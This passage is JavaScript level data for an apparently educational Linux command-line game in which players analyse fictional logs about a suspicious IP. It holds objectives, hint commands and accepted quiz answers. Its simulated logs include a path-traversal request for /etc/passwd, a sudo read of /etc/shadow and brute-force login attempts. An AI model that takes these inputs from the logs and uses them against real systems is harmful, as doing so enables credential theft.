                '/home/operator/intel/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 892,
                    content: `192.168.1.105 - - [15/Jan/2024:10:15:32] "GET /admin/login.php" 200
192.168.1.42 - - [15/Jan/2024:10:16:01] "GET /index.html" 200
10.0.0.88 - - [15/Jan/2024:10:16:45] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:17:22] "GET /admin/config.php" 200
192.168.1.42 - - [15/Jan/2024:10:18:03] "GET /images/logo.png" 200
10.0.0.88 - - [15/Jan/2024:10:18:55] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:19:12] "GET /admin/users.php" 200
172.16.0.23 - - [15/Jan/2024:10:20:01] "GET /robots.txt" 200
192.168.1.105 - - [15/Jan/2024:10:21:33] "POST /admin/export" 200
10.0.0.88 - - [15/Jan/2024:10:22:15] "POST /api/upload" 403
192.168.1.42 - - [15/Jan/2024:10:23:44] "GET /contact.html" 200
192.168.1.105 - - [15/Jan/2024:10:24:08] "GET /admin/logs.php" 200`
                },
                '/home/operator/intel/users.db': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `admin:x:1000:1000:System Admin:/home/admin:/bin/bash
jsmith:x:1001:1001:John Smith:/home/jsmith:/bin/bash
operator:x:1002:1002:Field Operator:/home/operator:/bin/bash
analyst:x:1003:1003:Data Analyst:/home/analyst:/bin/bash
guest:x:1004:1004:Guest User:/home/guest:/bin/false
backup:x:1005:1005:Backup Service:/var/backup:/bin/false
monitor:x:1006:1006:Monitor Daemon:/var/monitor:/bin/false`
                },
                '/home/operator/intel/network.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 298,
                    content: `TCP 192.168.1.105:44821 -> 10.0.0.5:443 ESTABLISHED
TCP 192.168.1.42:55123 -> 10.0.0.5:80 ESTABLISHED
UDP 10.0.0.88:53421 -> 8.8.8.8:53 DNS_QUERY
TCP 192.168.1.105:44822 -> 10.0.0.5:22 ESTABLISHED
TCP 172.16.0.23:61234 -> 10.0.0.5:80 TIME_WAIT
TCP 10.0.0.88:48372 -> 10.0.0.5:443 SYN_SENT
TCP 10.0.0.88:48373 -> 10.0.0.5:443 SYN_SENT
UDP 192.168.1.105:55000 -> 10.0.0.1:53 DNS_QUERY`
                },
                '/home/operator/intel/auth.log': {
                    type: 'file',
                    perms: '-rw-r-----',
                    owner: 'root',
                    group: 'adm',
                    size: 1024,
                    content: `Jan 15 09:45:12 shadow sshd[2341]: Accepted publickey for operator from 192.168.1.105 port 52413
Jan 15 09:52:33 shadow sshd[2456]: Failed password for admin from 10.0.0.88 port 44123
Jan 15 09:52:35 shadow sshd[2456]: Failed password for admin from 10.0.0.88 port 44123
Jan 15 09:52:38 shadow sshd[2456]: Failed password for admin from 10.0.0.88 port 44123
Jan 15 09:52:41 shadow sshd[2456]: Connection closed by 10.0.0.88 port 44123 [preauth]
Jan 15 10:01:22 shadow sudo: operator : TTY=pts/0 ; PWD=/home/operator ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jan 15 10:15:00 shadow sshd[2512]: Accepted password for jsmith from 192.168.1.42 port 55612
Jan 15 10:22:18 shadow sshd[2534]: Invalid user scanner from 10.0.0.88 port 44200
Jan 15 10:22:19 shadow sshd[2534]: Failed password for invalid user scanner from 10.0.0.88 port 44200`
                },
                '/home/operator/intel/captured.pcap.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 645,
                    content: `# Packet capture summary - extracted from wireshark
# Source: 10.0.0.88 (Threat Actor)
Frame 1: 10.0.0.88 -> 10.0.0.5 TCP SYN port 443
Frame 2: 10.0.0.5 -> 10.0.0.88 TCP SYN-ACK
Frame 3: 10.0.0.88 -> 10.0.0.5 TCP ACK
Frame 4: 10.0.0.88 -> 10.0.0.5 HTTP POST /api/upload
Frame 5: 10.0.0.5 -> 10.0.0.88 HTTP 403 Forbidden
Frame 6: 10.0.0.88 -> 10.0.0.5 TCP FIN
# Pattern: Automated upload attempts every 2 minutes
# Recommendation: Block 10.0.0.88 at firewall`
                },
                // === LOGS DIRECTORY ===
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['app.log', 'error.log', 'cron.log', 'firewall.log']
                },
                '/home/operator/logs/app.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `2024-01-15 10:00:01 INFO  Application started
2024-01-15 10:00:02 INFO  Database connection established
2024-01-15 10:15:32 INFO  User login: admin from 192.168.1.105
2024-01-15 10:16:45 WARN  Upload rejected: unauthorized IP 10.0.0.88
2024-01-15 10:18:55 WARN  Upload rejected: unauthorized IP 10.0.0.88
2024-01-15 10:20:01 INFO  Robots.txt served to 172.16.0.23
2024-01-15 10:22:15 WARN  Upload rejected: unauthorized IP 10.0.0.88
2024-01-15 10:30:00 INFO  Scheduled backup started
2024-01-15 10:30:45 INFO  Backup completed: 2.3GB`
                },
                '/home/operator/logs/error.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `[ERROR] 2024-01-15 10:16:45 - AuthModule: IP not in whitelist: 10.0.0.88
[ERROR] 2024-01-15 10:18:55 - AuthModule: IP not in whitelist: 10.0.0.88
[ERROR] 2024-01-15 10:22:15 - AuthModule: IP not in whitelist: 10.0.0.88
[ERROR] 2024-01-15 10:25:33 - DBModule: Query timeout after 30s
[WARN]  2024-01-15 10:26:00 - DBModule: Reconnecting to database
[ERROR] 2024-01-15 10:45:12 - FileModule: Disk space below 10%`
                },
                '/home/operator/logs/cron.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Jan 15 00:00:01 CRON[1001]: (root) CMD (/usr/bin/log-rotate)
Jan 15 00:05:00 CRON[1023]: (backup) CMD (/opt/backup/daily.sh)
Jan 15 06:00:00 CRON[1156]: (root) CMD (/usr/bin/apt-daily)
Jan 15 10:30:00 CRON[1289]: (operator) CMD (/home/operator/scripts/monitor.sh)`
                },
                '/home/operator/logs/firewall.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 720,
                    content: `Jan 15 10:16:44 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=22
Jan 15 10:18:54 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=22
Jan 15 10:22:14 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=22
Jan 15 10:25:00 ALLOW IN=eth0 SRC=192.168.1.105 DST=10.0.0.5 PROTO=TCP DPT=443
Jan 15 10:26:12 ALLOW IN=eth0 SRC=192.168.1.42 DST=10.0.0.5 PROTO=TCP DPT=80
Jan 15 10:30:00 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=3306
Jan 15 10:45:00 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=5432`
                },
                // === DATA DIRECTORY ===
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['employees.csv', 'servers.csv', 'ports.txt', 'ips_whitelist.txt']
                },
                '/home/operator/data/employees.csv': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 320,
                    content: `id,name,department,clearance,email
1001,John Smith,Engineering,3,jsmith@shadow.local
1002,Sarah Chen,Security,5,schen@shadow.local
1003,Mike Johnson,Operations,2,mjohnson@shadow.local
1004,Emily Brown,Research,4,ebrown@shadow.local
1005,David Wilson,IT,3,dwilson@shadow.local
1006,Lisa Anderson,Admin,1,landerson@shadow.local`
                },
                '/home/operator/data/servers.csv': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 280,
                    content: `hostname,ip,role,status,os
web01,10.0.0.5,webserver,active,ubuntu
db01,10.0.0.10,database,active,debian
app01,10.0.0.15,application,active,centos
backup01,10.0.0.20,backup,active,ubuntu
monitor01,10.0.0.25,monitoring,maintenance,debian`
                },
                '/home/operator/data/ports.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `22 SSH
80 HTTP
443 HTTPS
3306 MySQL
5432 PostgreSQL
6379 Redis
8080 HTTP-Alt
27017 MongoDB`
                },
                '/home/operator/data/ips_whitelist.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 120,
                    content: `# Authorized IPs
192.168.1.0/24  # Internal network
172.16.0.0/16   # VPN range
10.0.0.1        # Gateway
# NOTE: 10.0.0.88 is NOT authorized`
                },
                // === SCRIPTS DIRECTORY ===
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['monitor.sh', 'analyze_logs.sh', 'extract_ips.sh']
                },
                '/home/operator/scripts/monitor.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `#!/bin/bash
# System monitoring script
echo "=== System Status ==="
uptime
echo ""
echo "=== Disk Usage ==="
df -h
echo ""
echo "=== Active Connections ==="
netstat -tulpn | head -10`
                },
                '/home/operator/scripts/analyze_logs.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `#!/bin/bash
# Log analysis script
# Usage: ./analyze_logs.sh <logfile>

LOGFILE=\${1:-intel/access.log}

echo "=== Top 5 IPs by Request Count ==="
cut -d ' ' -f 1 "$LOGFILE" | sort | uniq -c | sort -rn | head -5

echo ""
echo "=== HTTP Status Codes ==="
awk '{print $9}' "$LOGFILE" | sort | uniq -c | sort -rn`
                },
                '/home/operator/scripts/extract_ips.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `#!/bin/bash
# Extract unique IPs from a log file
# Usage: ./extract_ips.sh <logfile>

grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' "\${1:-/dev/stdin}" | sort -u`
                },
                // === REPORTS DIRECTORY ===
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt', 'threat_brief.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `# Analysis Reports Directory
Save your processed output here.

Example:
  cut -d ' ' -f 1 intel/access.log | sort | uniq -c > reports/ip_counts.txt`
                },
                '/home/operator/reports/threat_brief.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 420,
                    content: `THREAT INTELLIGENCE BRIEF
Date: 2024-01-15
Classification: INTERNAL

SUMMARY:
Suspicious activity detected from external IP.
Multiple unauthorized access attempts to /api/upload endpoint.

ACTION ITEMS:
[ ] Identify threat actor IP using log analysis
[ ] Correlate with auth.log for SSH attempts
[ ] Check firewall logs for blocked connections
[ ] Generate report of all 403 responses`
                },
                // === HIDDEN CONFIG ===
                '/home/operator/.config': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['aliases.conf', 'tools.conf']
                },
                '/home/operator/.config/aliases.conf': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `# Custom aliases
alias ll='ls -la'
alias grep='grep --color=auto'
alias ipcount='cut -d " " -f 1 | sort | uniq -c | sort -rn'
alias top10='head -10'`
                },
                '/home/operator/.config/tools.conf': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 120,
                    content: `# Tool configurations
EDITOR=vim
PAGER=less
LOG_DIR=/home/operator/logs
REPORT_DIR=/home/operator/reports`
                },
                // === HIDDEN NOTES ===
                '/home/operator/.notes': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 280,
                    content: `Personal investigation notes:

That IP 10.0.0.88 keeps hitting us. Three failed SSH logins,
then switched to the API. Classic pivot behavior.

Check patterns:
- grep "10.0.0.88" intel/*.log
- cut + sort + uniq to see frequency

This might be automated. Check timing intervals.`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `ls -la
cd intel
cat access.log
grep 403 access.log
cut -d ' ' -f 1 access.log | sort | uniq -c
cat ../reports/threat_brief.txt
ls -la /home/operator/.config/`
                },
                '/home/operator/.text_processing_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 1024,
                    content: `TEXT PROCESSING - OPERATOR CHEATSHEET
=======================================

CUT - Extract columns/fields
  cut -d ' ' -f 1 file      Field 1, space delimiter
  cut -d ',' -f 2,3 file    Fields 2 and 3, comma delim
  cut -c 1-10 file          Characters 1-10

SORT - Order lines
  sort file                 Alphabetical sort
  sort -n file              Numeric sort
  sort -r file              Reverse sort
  sort -k2 file             Sort by column 2
  sort -t ',' -k3 file      Sort by field 3, comma delim

UNIQ - Deduplicate (requires sorted input)
  uniq file                 Remove duplicates
  uniq -c file              Count occurrences
  uniq -d file              Show only duplicates
  sort file | uniq -c       Common pattern

AWK - Field processing
  awk '{print $1}' file         First field
  awk -F: '{print $1}' file     First field, colon delim
  awk '{print $1, $3}' file     Multiple fields
  awk '/pattern/' file          Filter lines

SED - Stream editing
  sed 's/old/new/' file         Replace first match
  sed 's/old/new/g' file        Replace all matches
  sed '/pattern/d' file         Delete matching lines
  sed -n '1,10p' file           Print lines 1-10

COMMON PIPELINES
  cut -d ' ' -f 1 file | sort | uniq -c | sort -rn
  grep pattern file | awk '{print $2}' | sort -u
  sed 's/secret/[REDACTED]/g' file > sanitized.txt

"Transform data. Extract intelligence."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'EXTRACT: Cut IP Addresses',
                    hint: 'Use cut to extract IPs: cut -d \' \' -f 1 intel/access.log',
                    check: (cmd, state, output) => cmd.includes('cut') && cmd.includes('-d') && cmd.includes('-f') &&
                               (cmd.includes('1') || cmd.includes('access')) &&
                               output && !output.startsWith('cut:')
                },
                {
                    id: 2,
                    task: 'ORGANIZE: Sort the Log Entries',
                    hint: 'Sort the log: sort intel/access.log',
                    check: (cmd, state, output) => cmd.includes('sort') && cmd.includes('access') &&
                               output && !output.startsWith('sort:')
                },
                {
                    id: 3,
                    task: 'ANALYZE: Count Unique IPs',
                    hint: 'Pipe commands: cut -d \' \' -f 1 intel/access.log | sort | uniq -c',
                    check: (cmd, state, output) => cmd.includes('uniq') && (cmd.includes('-c') || cmd.includes('sort')) &&
                               output && !output.startsWith('uniq:')
                },
                {
                    id: 4,
                    task: 'PARSE: Extract Usernames with AWK',
                    hint: 'Use awk: awk -F: \'{print $1}\' intel/users.db',
                    check: (cmd, state, output) => cmd.includes('awk') && (cmd.includes('print') || cmd.includes('users')) &&
                               output && !output.startsWith('awk:')
                },
                {
                    id: 5,
                    task: 'SANITIZE: Redact IPs with SED',
                    hint: 'sed \'s/10.0.0.88/[REDACTED]/g\' intel/access.log',
                    check: (cmd, state, output) => cmd.includes('sed') && cmd.includes('s/') &&
                               (cmd.includes('REDACTED') || cmd.includes('access')) &&
                               output && !output.startsWith('sed:')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "Based on your analysis, which IP is making unauthorized upload attempts?",
                hint: "Look for repeated 403 (forbidden) responses in the access log.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['10.0.0.88'],
                correctAnswerMessage: 'Intel confirmed. IP 10.0.0.88 identified as the unauthorized upload source.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-010: I/O Redirection
        // Theme: Data stream control and redirection
        // ──────────────────────────────────────────────────────────
        'CLH-010': {
            title: 'I/O Redirection',
            description: 'Master output redirection, pipes, and data stream control.',
            prerequisites: ['CLH-009'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'reports', 'logs', 'data', '.bash_history', '.redirect_cheatsheet']
                },
                // === INTEL DIRECTORY ===
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['access.log', 'targets.txt', 'notes.txt', 'connections.log', 'errors.log']
                },
                '/home/operator/intel/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 720,
                    content: `192.168.1.105 - - [15/Jan/2024:10:15:32] "GET /admin/login.php" 200
192.168.1.42 - - [15/Jan/2024:10:16:01] "GET /index.html" 200
10.0.0.88 - - [15/Jan/2024:10:16:45] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:17:22] "GET /admin/config.php" 200
192.168.1.42 - - [15/Jan/2024:10:18:03] "GET /images/logo.png" 200
10.0.0.88 - - [15/Jan/2024:10:18:55] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:19:12] "GET /admin/users.php" 200
172.16.0.23 - - [15/Jan/2024:10:20:01] "GET /robots.txt" 200
192.168.1.105 - - [15/Jan/2024:10:21:33] "POST /admin/export" 200
10.0.0.88 - - [15/Jan/2024:10:22:15] "POST /api/upload" 403`
                },
                '/home/operator/intel/targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `192.168.1.105 - Primary target
192.168.1.42 - Secondary target
10.0.0.88 - Unknown actor
172.16.0.23 - Reconnaissance probe`
                },
                '/home/operator/intel/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `Analyst notes: Monitor 192.168.1.105 for persistence
Priority: HIGH
Last updated: 2024-01-15 10:30 UTC`
                },
                '/home/operator/intel/connections.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 320,
                    content: `TCP 192.168.1.105:44821 -> 10.0.0.5:443 ESTABLISHED
TCP 192.168.1.42:55123 -> 10.0.0.5:80 ESTABLISHED
UDP 10.0.0.88:53421 -> 8.8.8.8:53 DNS_QUERY
TCP 192.168.1.105:44822 -> 10.0.0.5:22 SSH
TCP 172.16.0.23:61234 -> 10.0.0.5:80 TIME_WAIT
TCP 10.0.0.88:48372 -> 10.0.0.5:443 REJECTED`
                },
                '/home/operator/intel/errors.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `[ERROR] 10:16:45 Auth failed: 10.0.0.88
[ERROR] 10:18:55 Auth failed: 10.0.0.88
[WARN]  10:20:01 Suspicious scan: 172.16.0.23
[ERROR] 10:22:15 Auth failed: 10.0.0.88
[INFO]  10:25:00 Backup completed successfully`
                },
                // === LOGS DIRECTORY ===
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['system.log', 'auth.log']
                },
                '/home/operator/logs/system.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `Jan 15 10:00:00 shadow systemd[1]: Started Daily apt activities.
Jan 15 10:15:00 shadow kernel: eth0: link up 1000Mbps
Jan 15 10:30:00 shadow cron[1234]: (operator) CMD (backup.sh)
Jan 15 10:45:00 shadow systemd[1]: Starting log rotation...
Jan 15 11:00:00 shadow systemd[1]: Finished log rotation.`
                },
                '/home/operator/logs/auth.log': {
                    type: 'file',
                    perms: '-rw-r-----',
                    owner: 'root',
                    group: 'adm',
                    size: 512,
                    content: `Jan 15 09:45:12 shadow sshd[2341]: Accepted key for operator from 192.168.1.105
Jan 15 09:52:33 shadow sshd[2456]: Failed password for admin from 10.0.0.88
Jan 15 09:52:35 shadow sshd[2456]: Failed password for admin from 10.0.0.88
Jan 15 10:01:22 shadow sudo: operator : TTY=pts/0 ; USER=root ; COMMAND=/bin/cat
Jan 15 10:15:00 shadow sshd[2512]: Accepted password for jsmith from 192.168.1.42`
                },
                // === DATA DIRECTORY ===
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['wordlist.txt', 'ips.txt']
                },
                '/home/operator/data/wordlist.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 64,
                    content: `admin
password
root
user
guest
test
backup`
                },
                '/home/operator/data/ips.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 80,
                    content: `192.168.1.105
192.168.1.42
10.0.0.88
172.16.0.23
10.0.0.5`
                },
                // === REPORTS DIRECTORY ===
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mission.log', 'README.txt']
                },
                '/home/operator/reports/mission.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `=== MISSION LOG ===
Mission: Stream Control Training
Status: In Progress
Objective: Master I/O redirection
`
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `# Reports Directory

Use this directory to save your analysis output.

Redirect examples:
  command > file.txt    # Write output to file (overwrite)
  command >> file.txt   # Append output to file
  command | tee file    # Output to screen AND file`
                },
                // === HIDDEN FILES ===
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `ls -la
cat intel/access.log
grep 403 intel/access.log
ls intel > reports/inventory.txt
date >> reports/mission.log
cat intel/notes.txt`
                },
                '/home/operator/.redirect_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 420,
                    content: `=== I/O REDIRECTION CHEATSHEET ===

STDOUT (Standard Output):
  >   Redirect output (overwrite)
  >>  Redirect output (append)
  |   Pipe to another command

STDIN (Standard Input):
  <   Read input from file

STDERR (Standard Error):
  2>  Redirect errors
  2>&1  Redirect errors to stdout

TEE (Split stream):
  cmd | tee file    # Screen AND file
  cmd | tee -a file # Append mode`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'CAPTURE: Redirect Output to File',
                    hint: 'ls intel > reports/filelist.txt',
                    check: (cmd, state, output) => {
                        return cmd.includes('>') && !cmd.includes('>>') && cmd.includes('reports') &&
                               output && output.includes('Redirected');
                    }
                },
                {
                    id: 2,
                    task: 'APPEND: Add Timestamp to Log',
                    hint: 'date >> reports/mission.log',
                    check: (cmd, state, output) => cmd.includes('>>') && cmd.includes('mission.log') &&
                               output && output.includes('Redirected')
                },
                {
                    id: 3,
                    task: 'PIPELINE: Filter and Count',
                    hint: 'grep "192.168" intel/access.log | wc -l',
                    check: (cmd, state, output) => cmd.includes('|') && cmd.includes('grep') &&
                               cmd.includes('wc') && output && /^\s*\d+/.test(output)
                },
                {
                    id: 4,
                    task: 'CHAIN: Multi-Stage Pipeline',
                    hint: 'cut -d \' \' -f 1 intel/access.log | sort | uniq -c',
                    check: (cmd, state, output) => {
                        const pipeCount = (cmd.match(/\|/g) || []).length;
                        return pipeCount >= 2 && cmd.includes('uniq') && output && output.includes('192');
                    }
                },
                {
                    id: 5,
                    task: 'TEE: Split the Stream',
                    hint: 'ls -la intel | tee reports/inventory.txt',
                    check: (cmd, state, output) => cmd.includes('tee') && cmd.includes('reports') &&
                               output && !output.startsWith('tee:')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "According to the analyst notes, which IP should be monitored for persistence?",
                hint: "Check the intel directory for analyst notes about monitoring targets.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['192.168.1.105'],
                correctAnswerMessage: 'Intel confirmed. Target 192.168.1.105 flagged for persistent access monitoring.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-011: Advanced Grep
        // Theme: Pattern matching and regex mastery
        // ──────────────────────────────────────────────────────────
        'CLH-011': {
            title: 'Advanced Grep',
            description: 'Master grep options and regular expressions for pattern hunting.',
            prerequisites: ['CLH-010'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['logs', 'reports', 'data', '.bash_history', '.grep_cheatsheet']
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['system.log', 'auth.log', 'network.log', 'access.log', 'error.log']
                },
                '/home/operator/logs/system.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 678,
                    content: `Jan 15 10:15:32 shadow kernel: [INFO] System started
Jan 15 10:15:33 shadow systemd: [INFO] Network service started
Jan 15 10:16:01 shadow kernel: [ERROR] Disk I/O timeout on /dev/sdb
Jan 15 10:16:45 shadow cron: [INFO] Scheduled task executed
Jan 15 10:17:22 shadow kernel: [Warning] High memory usage detected
Jan 15 10:18:03 shadow systemd: [INFO] Service httpd restarted
Jan 15 10:18:55 shadow kernel: [ERROR] Buffer overflow in module xyz
Jan 15 10:19:12 shadow sshd: [INFO] Connection from 192.168.1.105
Jan 15 10:20:01 shadow kernel: [error] Failed to allocate memory
Jan 15 10:21:33 shadow systemd: [INFO] Backup completed
Jan 15 10:22:15 shadow kernel: [ERROR] Watchdog timeout - system unstable`
                },
                '/home/operator/logs/auth.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 612,
                    content: `Jan 15 10:15:32 shadow sshd[1234]: FAILED login for admin from 10.0.0.88
Jan 15 10:15:45 shadow sshd[1234]: FAILED login for admin from 10.0.0.88
Jan 15 10:16:01 shadow sshd[1235]: success login for operator from 192.168.1.42
Jan 15 10:16:22 shadow sshd[1234]: FAILED login for root from 10.0.0.88
Jan 15 10:17:03 shadow sshd[1236]: success login for analyst from 192.168.1.105
Jan 15 10:17:45 shadow sshd[1234]: FAILED login for admin from 10.0.0.88
Jan 15 10:18:12 shadow sshd[1237]: success login for backup from localhost
Jan 15 10:18:55 shadow sshd[1234]: FAILED login for root from 10.0.0.88
Jan 15 10:19:33 shadow sshd[1234]: FAILED login for test from 10.0.0.88
Jan 15 10:20:15 shadow sshd[1238]: success login for monitor from 172.16.0.23`
                },
                '/home/operator/logs/network.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `10:15:32 TCP 192.168.1.105:44821 -> 10.0.0.5:443 ESTABLISHED
10:15:45 TCP 192.168.1.42:55123 -> 10.0.0.5:80 ESTABLISHED
10:16:01 UDP 10.0.0.88:53421 -> 8.8.8.8:53 DNS_QUERY
10:16:22 TCP 192.168.1.105:44822 -> 10.0.0.5:22 ESTABLISHED
10:17:03 TCP 172.16.0.23:61234 -> 10.0.0.5:80 TIME_WAIT
10:17:45 ICMP 10.0.0.88 -> 192.168.1.1 ECHO_REQUEST
10:18:12 TCP 192.168.1.105:44823 -> 10.0.0.5:3306 ESTABLISHED
10:18:55 UDP 192.168.1.42:12345 -> 10.0.0.5:161 SNMP
10:19:33 TCP 10.0.0.88:55555 -> 192.168.1.1:445 SYN_SENT
10:20:15 TCP 172.16.0.23:61235 -> 10.0.0.5:443 ESTABLISHED`
                },
                '/home/operator/logs/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 892,
                    content: `192.168.1.105 - - [15/Jan/2024:10:15:32] "GET /admin/login.php" 200 1234
10.0.0.88 - - [15/Jan/2024:10:15:45] "POST /admin/login.php" 401 567
192.168.1.42 - - [15/Jan/2024:10:16:01] "GET /index.html" 200 8901
10.0.0.88 - - [15/Jan/2024:10:16:22] "POST /admin/login.php" 401 567
192.168.1.105 - - [15/Jan/2024:10:17:03] "GET /api/users" 200 2345
10.0.0.88 - - [15/Jan/2024:10:17:45] "POST /admin/login.php" 401 567
172.16.0.23 - - [15/Jan/2024:10:18:12] "GET /dashboard" 200 4567
10.0.0.88 - - [15/Jan/2024:10:18:55] "GET /robots.txt" 200 123
192.168.1.105 - - [15/Jan/2024:10:19:33] "GET /admin/config.php" 403 234
10.0.0.88 - - [15/Jan/2024:10:20:15] "GET /../../../etc/passwd" 400 0`
                },
                '/home/operator/logs/error.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
